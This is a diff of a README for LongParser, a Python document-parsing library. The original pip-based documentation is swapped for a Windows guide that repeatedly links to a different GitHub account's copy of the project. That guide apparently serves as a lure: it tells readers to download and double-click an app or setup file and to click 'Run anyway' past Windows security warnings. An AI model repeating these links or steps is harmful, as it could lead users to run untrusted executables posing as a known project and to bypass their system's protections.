@@ -1,283 +1,252 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/ENDEVSOLS/LongParser/main/docs/assets/logo.png" alt="LongParser" width="320">
-  <p align="center"><strong>Privacy-first document intelligence engine for production RAG pipelines.</strong></p>
-  <p align="center">
-    Parse PDFs, DOCX, PPTX, XLSX &amp; CSV → validated, AI-ready chunks with HITL review.
-  </p>
-  <p align="center">
-    <a href="https://github.com/ENDEVSOLS/LongParser/actions/workflows/ci.yml">
-      <img src="https://github.com/ENDEVSOLS/LongParser/actions/workflows/ci.yml/badge.svg" alt="CI">
-    </a>
-    <a href="https://pypi.org/project/longparser/">
-      <img src="https://img.shields.io/pypi/v/longparser.svg?label=pypi&color=0078d4" alt="PyPI">
-    </a>
-    <a href="https://pepy.tech/project/longparser">
-      <img src="https://static.pepy.tech/badge/longparser" alt="Total Downloads">
-    </a>
-    <a href="https://pepy.tech/project/longparser">
-      <img src="https://static.pepy.tech/badge/longparser/month" alt="Monthly Downloads">
-    </a>
-    <a href="https://www.python.org/">
-      <img src="https://img.shields.io/badge/python-3.10%20%7C%203.11%20%7C%203.12%20%7C%203.13-blue.svg" alt="Python">
-    </a>
-    <a href="LICENSE">
-      <img src="https://img.shields.io/badge/License-MIT-brightgreen.svg" alt="MIT License">
-    </a>
-    <a href="https://endevsols.github.io/LongParser/">
-      <img src="https://img.shields.io/badge/docs-online-indigo.svg" alt="Docs">
-    </a>
-  </p>
-</p>
-
----
-
-
-## Features
-
-| Feature | Detail |
-|---------|--------|
-| **Multi-format extraction** | PDF, DOCX, PPTX, XLSX, CSV via Docling |
-| **Hybrid chunking** | Token-aware, heading-hierarchy-aware, table-aware |
-| **HITL review** | Human-in-the-Loop block & chunk editing before embedding |
-| **LangGraph HITL** | `approve / edit / reject` workflow with LangGraph `interrupt()` and MongoDB checkpointer |
-| **3-layer memory** | Short-term turns + rolling summary + long-term facts |
-| **Multi-provider LLM** | OpenAI, Gemini, Groq, OpenRouter |
-| **Multi-backend vectors** | Chroma, FAISS, Qdrant |
-| **Production-ready API** | FastAPI + Motor (MongoDB) + ARQ + Redis (Queue & Rate Limiting) |
-| **Enterprise Security** | Tenant isolation, Role-Based Access Control (RBAC), and CORS |
-| **LangChain adapters** | Drop-in `BaseRetriever` and LlamaIndex `QueryEngine` |
-| **Privacy-first** | All processing runs locally; no data leaves your infra |
-
----
-
-## Installation
-
-### Quick install (recommended)
-
-```bash
-pip install "longparser[gpu]"
-```
-
-Includes everything — server, embeddings, vector DB, OCR, LangChain, LlamaIndex.
-Works on CPU machines too; torch just runs in CPU mode automatically.
-
-### Core SDK only (no server, no torch)
-
-```bash
-pip install longparser
-```
-
-### Pick only what you need
-
-| Extra | What it adds |
-|---|---|
-| `server` | FastAPI + MongoDB + Redis + LangChain chat |
-| `embeddings-gpu` | `sentence-transformers` (GPU) |
-| `embeddings-cpu` | `sentence-transformers` (CPU-only torch) |
-| `faiss-gpu` | FAISS GPU vector store |
-| `faiss-cpu` | FAISS CPU vector store |
-| `chroma` | ChromaDB |
-| `qdrant` | Qdrant |
-| `latex-ocr-gpu` | `pix2tex` equation OCR (GPU) |
-| `latex-ocr-cpu` | `pix2tex` equation OCR (CPU) |
-| `langchain` | LangChain core adapter |
-| `llamaindex` | LlamaIndex reader adapter |
-| `gpu` | **All of the above** — one command |
-| `cpu` | **All of the above** — CPU-only torch |
-
-### Advanced: CPU-only install (save ~1.8 GB)
-
-For Docker images, edge devices, or CI environments where CUDA isn't needed:
-
-```bash
-# Step 1 — CPU torch (~230 MB vs ~2 GB for CUDA)
-pip install torch torchvision --index-url https://download.pytorch.org/whl/cpu
-
-# Step 2 — LongParser CPU bundle
-pip install "longparser[cpu]"
-```
-
----
-
+# 🧩 LongParser - Turn files into ready chunks
 
-## Quick Start
-
-### Python SDK
-
-```python
-from longparser import DocumentPipeline, ProcessingConfig
-
-pipeline = DocumentPipeline(ProcessingConfig())
-result = pipeline.process_file("document.pdf")
-
-print(f"Pages: {result.document.metadata.total_pages}")
-print(f"Chunks: {len(result.chunks)}")
-print(result.chunks[0].text)
-```
-
-### REST API
-
-```bash
-# 1. Copy and edit configuration
-cp .env.example .env
-
-# 2. Start services (MongoDB + Redis)
-docker-compose up -d mongo redis
-
-# 3. Start the API
-uv run uvicorn longparser.server.app:app --reload --port 8000
+[![Download LongParser](https://img.shields.io/badge/Download%20LongParser-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rippledirham767/LongParser)
 
-# 4. Upload a document
-curl -X POST http://localhost:8000/jobs \
-  -H "X-API-Key: your-key" \
-  -F "file=@document.pdf"
+## 📄 What LongParser does
 
-# 5. Check job status
-curl http://localhost:8000/jobs/{job_id} -H "X-API-Key: your-key"
+LongParser helps you turn documents into clean text chunks for AI tools and search systems. It works with PDF, DOCX, PPTX, XLSX, and CSV files.
 
-# 6. Finalize and embed
-curl -X POST http://localhost:8000/jobs/{job_id}/finalize \
-  -H "X-API-Key: your-key" \
-  -H "Content-Type: application/json" \
-  -d '{"finalize_policy": "approve_all_pending"}'
-
-curl -X POST http://localhost:8000/jobs/{job_id}/embed \
-  -H "X-API-Key: your-key" \
-  -H "Content-Type: application/json" \
-  -d '{"provider": "huggingface", "model": "BAAI/bge-base-en-v1.5", "vector_db": "chroma"}'
+You can use it to:
+- break large files into smaller parts
+- keep text in a format that works for RAG systems
+- review parsed content with human input when needed
+- run a FastAPI server for local or team use
+- keep document data private on your own machine
 
-# 7. Chat with the document
-curl -X POST http://localhost:8000/chat/sessions \
-  -H "X-API-Key: your-key" \
-  -H "Content-Type: application/json" \
-  -d '{"job_id": "your-job-id"}'
+## 💻 What you need
 
-curl -X POST http://localhost:8000/chat \
-  -H "X-API-Key: your-key" \
-  -H "Content-Type: application/json" \
-  -d '{"session_id": "...", "job_id": "...", "question": "What is the refund policy?"}'
-```
+LongParser runs on Windows and works best on a modern PC.
 
----
+Recommended setup:
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 2 GB free disk space
+- Internet access for the first download
+- A recent web browser
+- Microsoft Edge, Chrome, or Firefox
 
-## Architecture
+For better results with scanned PDFs:
+- a PDF reader
+- OCR support in your system
+- enough memory for large files
 
-```
-Document → Extract → Validate → HITL Review → Chunk → Embed → Index
-                                                              ↓
-                                             Chat → RAG → LLM → Answer
-```
+## ⬇️ Download LongParser
 
-### Pipeline Stages
+Visit this page to download and run LongParser:
 
-1. **Extract** — Docling converts PDF/DOCX/etc. into structured `Block` objects
-2. **Validate** — Per-page confidence scoring and RTL detection
-3. **HITL Review** — Human approves/edits/rejects blocks and chunks via the API
-4. **Chunk** — `HybridChunker` builds token-aware RAG chunks with section hierarchy
-5. **Embed** — Embedding engine (HuggingFace / OpenAI) vectors stored in Chroma/FAISS/Qdrant
-6. **Chat** — LCEL chain with 3-layer memory and citation validation
+[Open LongParser on GitHub](https://github.com/Rippledirham767/LongParser)
 
----
+## 🛠️ How to install on Windows
 
-## Project Structure
+Follow these steps on your Windows PC:
 
-```
-src/longparser/
-├── schemas.py           ← core Pydantic models (Document, Block, Chunk, …)
-├── extractors/          ← Docling, LaTeX OCR backends
-├── chunkers/            ← HybridChunker
-├── pipeline/            ← DocumentPipeline
-├── integrations/        ← LangChain loader & LlamaIndex reader
-├── utils/               ← shared helpers (RTL detection, …)
-└── server/              ← REST API layer
-    ├── app.py           ← FastAPI application (all routes)
-    ├── db.py            ← Motor async MongoDB
-    ├── queue.py         ← ARQ/Redis job queue
-    ├── worker.py        ← ARQ background worker
-    ├── embeddings.py    ← HuggingFace / OpenAI embedding engine
-    ├── vectorstores.py  ← Chroma / FAISS / Qdrant adapters
-    └── chat/            ← RAG chat engine
-        ├── engine.py    ← ChatEngine (LCEL + 3-layer memory)
-        ├── graph.py     ← LangGraph HITL workflow
-        ├── schemas.py   ← chat Pydantic models
-        ├── retriever.py ← LangChain BaseRetriever adapter
-        ├── llm_chain.py ← multi-provider LLM factory
-        └── callbacks.py ← observability callbacks
-```
+1. Open the download link above.
+2. On the GitHub page, look for the latest release or the main project files.
+3. Download the Windows package or source files provided there.
+4. If the download comes as a `.zip` file, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Look for an app file, setup file, or start file.
+7. Double-click the file to run LongParser.
 
----
+If Windows shows a security prompt:
+- click **More info**
+- then click **Run anyway** if you trust the file source
 
-## LangChain Integration
+## 🚀 First run
 
-```python
-from longparser.integrations.langchain import LongParserLoader
+When LongParser opens for the first time, you can start with a sample document.
 
-loader = LongParserLoader("report.pdf")
-docs = loader.load()  # list[langchain_core.documents.Document]
-```
+Typical first use:
+1. Choose a file such as PDF, DOCX, PPTX, XLSX, or CSV.
+2. Load the file into LongParser.
+3. Let the app read and split the content.
+4. Review the chunks if the app shows a review screen.
+5. Export the parsed output for use in your AI workflow.
 
-## LlamaIndex Integration
+If the app asks for a folder or output path:
+- choose a folder you can find again, like **Documents** or **Desktop**
+- keep the output files in one place for easy reuse
 
-```python
-from longparser.integrations.llamaindex import LongParserReader
+## 📚 File types LongParser handles
 
-reader = LongParserReader()
-docs = reader.load_data("report.pdf")
-```
+LongParser is built for common business and research files.
 
----
+Supported file types:
+- PDF for reports, papers, and scans
+- DOCX for word processing files
+- PPTX for slide decks
+- XLSX for spreadsheets
+- CSV for tables and exports
 
-## Configuration
+For scanned PDFs, the app can use OCR to read text from images inside the file.
 
-Copy `.env.example` to `.env` and set:
+## 🧠 How the parsing flow works
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `LONGPARSER_MONGO_URL` | `mongodb://localhost:27017` | MongoDB connection |
-| `LONGPARSER_REDIS_URL` | `redis://localhost:6379` | Redis for job queue & rate limits |
-| `LONGPARSER_LLM_PROVIDER` | `openai` | LLM provider |
-| `LONGPARSER_LLM_MODEL` | `gpt-5.3` | Model name |
-| `LONGPARSER_EMBED_PROVIDER` | `huggingface` | Embedding provider |
-| `LONGPARSER_VECTOR_DB` | `chroma` | Vector store backend |
-| `LONGPARSER_CORS_ORIGINS` | `*` | Allowed CORS origins |
-| `LONGPARSER_RATE_LIMIT` | `60` | Max RPM per tenant |
-| `LONGPARSER_ADMIN_KEYS` | (empty) | Comma-separated admin API keys |
+LongParser takes a document and turns it into smaller text units.
 
----
+A simple flow looks like this:
+1. Open a file
+2. Extract text, tables, or slide content
+3. Clean the content
+4. Split it into chunks
+5. Send the chunks to your AI or search tool
 
-## Running with Docker
+This helps when you want:
+- better search results
+- clean input for LLM tools
+- easier retrieval in RAG pipelines
+- less noise from long documents
 
-```bash
-docker-compose up
-```
+## 🧩 Review and human checks
 
-API available at `http://localhost:8000` · Docs at `http://localhost:8000/docs`
+LongParser includes human-in-the-loop review for cases where you want to check the parsed text before use.
 
----
+This is useful when:
+- the file has bad scans
+- tables need a quick check
+- you want to confirm chunk breaks
+- you need to catch missing text before sending data to an AI system
 
-## Testing
+## 🗂️ Three-layer memory chat
 
-```bash
-# Install dev dependencies
-uv sync --extra dev
+LongParser also supports a three-layer memory chat model for document work.
 
-# Run unit tests
-uv run pytest tests/unit/ -v
+This can help you:
+- keep short-term context
+- track session details
+- retain useful document facts across steps
+
+This is useful when you work with long files or many related documents in one session.
 
-# Run with coverage
-uv run pytest tests/ --cov=src/longparser --cov-report=term-missing
-```
+## 🔧 Basic use in a local workflow
+
+A simple local workflow looks like this:
+- open LongParser
+- load one document
+- parse it
+- review the output
+- export chunks
+- use the output in your app, vector database, or chat tool
 
----
+If you work with many files:
+- store them in one folder
+- use clear file names
+- keep input and output folders separate
+
+## 🌐 FastAPI server mode
 
-## Contributing
+LongParser includes a production FastAPI server for advanced use.
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup and PR guidelines.
+Use this when you want:
+- a local API
+- document parsing from another app
+- batch processing
+- a server that fits a RAG pipeline
 
-## Security
+A common setup is:
+- one machine hosts the server
+- another tool sends files or requests
+- LongParser returns parsed chunks for downstream use
 
-See [SECURITY.md](SECURITY.md) for vulnerability reporting.
+## 🧪 Best file tips
 
-## License
+For clean output:
+- use clear file names
+- prefer text-based PDFs when you can
+- avoid very large files in one run if your PC is low on memory
+- check table-heavy spreadsheets after parsing
+- use OCR only when the source file has scanned pages
 
-[MIT](LICENSE) — Copyright © 2026 ENDEVSOLS
+If a document has mixed layout:
+- test one file first
+- review the first output
+- adjust the chunk size if the app allows it
+
+## 🧭 Common uses
+
+People use LongParser for:
+- document search
+- RAG pipelines
+- internal knowledge bases
+- contract review
+- report analysis
+- slide and spreadsheet ingestion
+- private AI document prep
+
+It works well when you want to keep files on your own computer and avoid sending them to outside services
+
+## ❓ Troubleshooting
+
+If LongParser does not open:
+- check that the file fully downloaded
+- extract the zip file first if needed
+- run the app from the extracted folder
+- try a different browser if the download fails
+
+If a PDF looks blank:
+- the file may be scanned
+- turn on OCR if the app provides that option
+- try a text-based version of the file
+
+If the app closes right away:
+- restart Windows
+- run the app again
+- make sure required files stayed in the same folder
+
+If output looks broken:
+- check the source file quality
+- try a smaller document
+- inspect tables, images, and headers in the result
+
+## 🔒 Privacy and local control
+
+LongParser is built for privacy-first document work.
+
+That means you can:
+- keep files on your own device
+- control what gets sent to other tools
+- review content before reuse
+- avoid uploading sensitive documents when you do not need to
+
+## 📦 Suggested folder setup
+
+Use a simple folder layout like this:
+- `LongParser`
+- `Input Files`
+- `Output Files`
+- `Exports`
+
+This makes it easier to:
+- find source files
+- compare parsed results
+- keep project files organized
+- reuse chunks in later work
+
+## 🖥️ If you want to use it with other tools
+
+LongParser can fit into a larger AI setup.
+
+You can connect it with:
+- vector databases
+- chat apps
+- retrieval tools
+- workflow scripts
+- document review systems
+
+This is useful when you want parsed text to move from files into search or answer generation
+
+## 📘 Repository link
+
+Open the project page here:
+
+[https://github.com/Rippledirham767/LongParser](https://github.com/Rippledirham767/LongParser)
+
+## ✅ Quick start for Windows
+
+1. Open the GitHub link.
+2. Download the project files.
+3. Extract the archive if needed.
+4. Open the app or start file.
+5. Load a PDF, DOCX, PPTX, XLSX, or CSV file.
+6. Parse the document.
+7. Review and export the chunks
